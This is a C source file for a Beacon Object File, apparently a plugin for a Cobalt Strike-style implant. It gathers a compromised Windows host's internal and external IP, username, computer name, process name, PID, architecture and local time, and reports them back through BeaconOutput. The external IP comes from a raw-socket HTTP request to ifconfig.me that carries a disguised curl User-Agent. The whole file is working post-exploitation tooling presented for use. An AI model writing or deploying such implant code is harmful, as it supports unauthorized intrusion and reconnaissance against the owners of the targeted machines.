/*
 * sysinfo_collect.c - BOF that collects system information and outputs it.
 *
 * Collects: internal IP, external IP (via ifconfig.me), username,
 * computer name, process name, PID, Windows architecture.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c sysinfo_collect.c -o sysinfo_collect.o
 */

#include <windows.h>
#include "beacon.h"

/* ---- BOF Imports ---- */
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetComputerNameA(LPSTR, LPDWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetCurrentProcessId(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);
DECLSPEC_IMPORT void   WINAPI KERNEL32$GetSystemInfo(LPSYSTEM_INFO);
DECLSPEC_IMPORT void   WINAPI KERNEL32$GetLocalTime(LPSYSTEMTIME);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);

/* WinSock2 via ws2_32 */
DECLSPEC_IMPORT int  WINAPI WS2_32$WSAStartup(WORD, void*);
DECLSPEC_IMPORT void WINAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT unsigned int WINAPI WS2_32$socket(int, int, int);
DECLSPEC_IMPORT int  WINAPI WS2_32$connect(unsigned int, const void*, int);
DECLSPEC_IMPORT int  WINAPI WS2_32$send(unsigned int, const char*, int, int);
DECLSPEC_IMPORT int  WINAPI WS2_32$recv(unsigned int, char*, int, int);
DECLSPEC_IMPORT int  WINAPI WS2_32$closesocket(unsigned int);
DECLSPEC_IMPORT unsigned short WINAPI WS2_32$htons(unsigned short);
DECLSPEC_IMPORT unsigned long  WINAPI WS2_32$inet_addr(const char*);
DECLSPEC_IMPORT int  WINAPI WS2_32$gethostbyname(const char*);
DECLSPEC_IMPORT int  WINAPI WS2_32$getsockname(unsigned int, void*, int*);

/* DNS resolve helper - use WS2_32$getaddrinfo if available, fallback to connect trick */

#define AF_INET_    2
#define SOCK_STREAM_ 1
#define SOCK_DGRAM_  2

static void bof_memset(void* dst, int val, unsigned long long n) {
    unsigned char* p = (unsigned char*)dst;
    while (n--) *p++ = (unsigned char)val;
}

static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

static int bof_strlen(const char* s) {
    int n = 0;
    while (s[n]) n++;
    return n;
}

static void bof_strcat(char* dst, const char* src) {
    int i = bof_strlen(dst);
    int j = 0;
    while (src[j]) dst[i++] = src[j++];
    dst[i] = '\0';
}

static void int_to_str(char* buf, unsigned int v) {
    char tmp[16];
    int i = 0;
    if (v == 0) { buf[0] = '0'; buf[1] = '\0'; return; }
    while (v > 0) { tmp[i++] = '0' + (v % 10); v /= 10; }
    int j = 0;
    while (i > 0) buf[j++] = tmp[--i];
    buf[j] = '\0';
}

static void ip_to_str(char* buf, unsigned char* ip) {
    char tmp[8];
    buf[0] = '\0';
    for (int i = 0; i < 4; i++) {
        int_to_str(tmp, ip[i]);
        bof_strcat(buf, tmp);
        if (i < 3) bof_strcat(buf, ".");
    }
}

/* Format time as YYYY-MM-DD HH:MM:SS */
static void format_time(char* buf, SYSTEMTIME* st) {
    char tmp[8];

    /* Year */
    int_to_str(tmp, st->wYear);
    bof_strcat(buf, tmp);
    bof_strcat(buf, "-");

    /* Month */
    if (st->wMonth < 10) bof_strcat(buf, "0");
    int_to_str(tmp, st->wMonth);
    bof_strcat(buf, tmp);
    bof_strcat(buf, "-");

    /* Day */
    if (st->wDay < 10) bof_strcat(buf, "0");
    int_to_str(tmp, st->wDay);
    bof_strcat(buf, tmp);
    bof_strcat(buf, " ");

    /* Hour */
    if (st->wHour < 10) bof_strcat(buf, "0");
    int_to_str(tmp, st->wHour);
    bof_strcat(buf, tmp);
    bof_strcat(buf, ":");

    /* Minute */
    if (st->wMinute < 10) bof_strcat(buf, "0");
    int_to_str(tmp, st->wMinute);
    bof_strcat(buf, tmp);
    bof_strcat(buf, ":");

    /* Second */
    if (st->wSecond < 10) bof_strcat(buf, "0");
    int_to_str(tmp, st->wSecond);
    bof_strcat(buf, tmp);
}

/* Get internal IP via UDP connect trick */
static void get_internal_ip(char* out, int outsz) {
    /* sockaddr_in: 2 bytes family, 2 bytes port, 4 bytes addr, 8 bytes zero */
    unsigned char sa[16];
    unsigned char local_sa[16];
    int sa_len;

    bof_memset(out, 0, outsz);
    bof_memset(sa, 0, sizeof(sa));

    /* AF_INET */
    sa[0] = AF_INET_; sa[1] = 0;
    /* port 53 in network byte order */
    sa[2] = 0; sa[3] = 53;
    /* 8.8.8.8 */
    sa[4] = 8; sa[5] = 8; sa[6] = 8; sa[7] = 8;

    unsigned int s = WS2_32$socket(AF_INET_, SOCK_DGRAM_, 17); /* IPPROTO_UDP=17 */
    if (s == (unsigned int)-1) {
        bof_memcpy(out, "127.0.0.1", 10);
        return;
    }

    if (WS2_32$connect(s, sa, 16) != 0) {
        WS2_32$closesocket(s);
        bof_memcpy(out, "127.0.0.1", 10);
        return;
    }

    bof_memset(local_sa, 0, sizeof(local_sa));
    sa_len = 16;
    WS2_32$getsockname(s, local_sa, &sa_len);
    WS2_32$closesocket(s);

    ip_to_str(out, &local_sa[4]);
}

/* Get external IP via HTTP GET to ifconfig.me */
static void get_external_ip(char* out, int outsz) {
    unsigned char sa[16];
    unsigned int s;
    int n;
    char req[] = "GET /ip HTTP/1.0\r\nHost: ifconfig.me\r\nUser-Agent: curl/8.0\r\nAccept: */*\r\n\r\n";
    char resp[512];

    bof_memset(out, 0, outsz);

    /* Resolve ifconfig.me - use inet_addr for known IP: 34.160.111.145 */
    bof_memset(sa, 0, sizeof(sa));
    sa[0] = AF_INET_; sa[1] = 0;
    /* port 80 network byte order */
    sa[2] = 0; sa[3] = 80;
    /* 34.160.111.145 */
    sa[4] = 34; sa[5] = 160; sa[6] = 111; sa[7] = 145;

    s = WS2_32$socket(AF_INET_, SOCK_STREAM_, 6); /* IPPROTO_TCP=6 */
    if (s == (unsigned int)-1) return;

    if (WS2_32$connect(s, sa, 16) != 0) {
        WS2_32$closesocket(s);
        return;
    }

    WS2_32$send(s, req, bof_strlen(req), 0);

    bof_memset(resp, 0, sizeof(resp));
    n = WS2_32$recv(s, resp, sizeof(resp) - 1, 0);
    WS2_32$closesocket(s);

    if (n <= 0) return;
    resp[n] = '\0';

    /* Find body after \r\n\r\n */
    char* body = NULL;
    for (int i = 0; i < n - 3; i++) {
        if (resp[i] == '\r' && resp[i+1] == '\n' && resp[i+2] == '\r' && resp[i+3] == '\n') {
            body = &resp[i + 4];
            break;
        }
    }
    if (!body) return;

    /* Trim whitespace */
    while (*body == ' ' || *body == '\r' || *body == '\n' || *body == '\t') body++;
    int len = bof_strlen(body);
    while (len > 0 && (body[len-1] == ' ' || body[len-1] == '\r' || body[len-1] == '\n')) len--;

    if (len > 0 && len < outsz) {
        bof_memcpy(out, body, len);
        out[len] = '\0';
    }
}

void go(char* args, int alen)
{
    char output[2048];
    char tmp[256];
    char numBuf[16];
    DWORD len;
    SYSTEM_INFO si;

    (void)args;
    (void)alen;

    /* Init Winsock */
    unsigned char wsaData[512];
    WS2_32$WSAStartup(0x0202, wsaData);

    bof_memset(output, 0, sizeof(output));

    /* ---- Node ID (agent knows this, BOF just marks placeholder) ---- */
    bof_strcat(output, "[SysInfo]\n");

    /* ---- Internal IP ---- */
    bof_memset(tmp, 0, sizeof(tmp));
    get_internal_ip(tmp, sizeof(tmp));
    bof_strcat(output, "Internal IP : ");
    bof_strcat(output, tmp);
    bof_strcat(output, "\n");

    /* ---- External IP ---- */
    bof_memset(tmp, 0, sizeof(tmp));
    get_external_ip(tmp, sizeof(tmp));
    bof_strcat(output, "External IP : ");
    bof_strcat(output, tmp[0] ? tmp : "(unreachable)");
    bof_strcat(output, "\n");

    /* ---- Username ---- */
    bof_memset(tmp, 0, sizeof(tmp));
    len = sizeof(tmp);
    if (ADVAPI32$GetUserNameA(tmp, &len)) {
        bof_strcat(output, "User        : ");
        bof_strcat(output, tmp);
        bof_strcat(output, "\n");
    } else {
        bof_strcat(output, "User        : unknown\n");
    }

    /* ---- Computer Name ---- */
    bof_memset(tmp, 0, sizeof(tmp));
    len = sizeof(tmp);
    if (KERNEL32$GetComputerNameA(tmp, &len)) {
        bof_strcat(output, "Computer    : ");
        bof_strcat(output, tmp);
        bof_strcat(output, "\n");
    } else {
        bof_strcat(output, "Computer    : unknown\n");
    }

    /* ---- Process Name ---- */
    bof_memset(tmp, 0, sizeof(tmp));
    DWORD pathLen = KERNEL32$GetModuleFileNameA(NULL, tmp, sizeof(tmp));
    if (pathLen > 0) {
        /* Extract filename from full path */
        char* fname = tmp;
        for (DWORD i = 0; i < pathLen; i++) {
            if (tmp[i] == '\\' || tmp[i] == '/') fname = &tmp[i + 1];
        }
        bof_strcat(output, "Process     : ");
        bof_strcat(output, fname);
        bof_strcat(output, "\n");
    } else {
        bof_strcat(output, "Process     : unknown\n");
    }

    /* ---- PID ---- */
    DWORD pid = KERNEL32$GetCurrentProcessId();
    int_to_str(numBuf, pid);
    bof_strcat(output, "PID         : ");
    bof_strcat(output, numBuf);
    bof_strcat(output, "\n");

    /* ---- Architecture ---- */
    bof_memset(&si, 0, sizeof(si));
    KERNEL32$GetSystemInfo(&si);
    bof_strcat(output, "Arch        : ");
    switch (si.wProcessorArchitecture) {
        case 9:  bof_strcat(output, "x86_64 (AMD64)"); break;
        case 12: bof_strcat(output, "ARM64"); break;
        case 0:  bof_strcat(output, "x86"); break;
        default:
            int_to_str(numBuf, si.wProcessorArchitecture);
            bof_strcat(output, "arch=");
            bof_strcat(output, numBuf);
            break;
    }
    bof_strcat(output, "\n");

    /* ---- Online Time ---- */
    SYSTEMTIME st;
    bof_memset(&st, 0, sizeof(st));
    KERNEL32$GetLocalTime(&st);
    bof_memset(tmp, 0, sizeof(tmp));
    format_time(tmp, &st);
    bof_strcat(output, "Online Time : ");
    bof_strcat(output, tmp);
    bof_strcat(output, "\n");

    WS2_32$WSACleanup();

    BeaconOutput(CALLBACK_OUTPUT, output, bof_strlen(output));
}
